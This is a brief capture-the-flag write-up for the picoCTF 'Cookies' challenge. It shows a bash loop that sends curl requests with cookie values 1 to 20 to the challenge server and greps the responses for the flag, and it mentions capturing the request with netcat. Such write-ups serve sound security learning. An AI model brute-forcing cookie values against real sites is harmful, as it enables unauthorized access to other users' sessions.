# Cookies (Bruteforcing Cookie id tag)
### by hexachroma
> Capture HTTP Req with netcat
>> ![http_req](cookie/documentation/http_req.png)
> with curl
 `for ((c=1; c<=20; c++)); do curl -s -H "Cookie: name=$c" http://mercury.picoctf.net:27177/check;done |grep picoCTF`

